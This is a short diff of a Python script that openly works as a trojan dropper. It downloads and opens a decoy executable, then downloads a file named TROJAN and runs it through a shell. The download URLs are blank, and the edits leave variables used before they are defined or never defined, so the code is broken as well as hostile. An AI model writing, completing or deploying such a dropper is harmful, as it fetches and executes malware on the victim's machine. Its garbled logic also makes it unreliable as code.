@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 import requests
 import subprocess
@@ -6,9 +6,9 @@ import os
 import tempfile
 
 CORPOREAL_EXE = ""
-TROJAN = ""
+TROJAN = TROJAN_FILE.split("/")[-1]
 CORPOREAL_FILE = CORPOREAL_EXE.split("/")[-1]
-TROJAN_FILE = TROJAN_FILE.split("/")[-1]
+TROJAN_FILE = ""
 
 def download(url):
     """
@@ -25,7 +25,7 @@ os.chdir(tmp_dir)
 
 download(DIRECT_EXE)
 # non-macos rm "open"
-subprocess.Popen("open {i}", shell=True).format(i=file)
+subprocess.Popen(f"open {DIRECT_EXE}", shell=True)
 
 download(TROJAN)
 subprocess.call(file, shell=True)
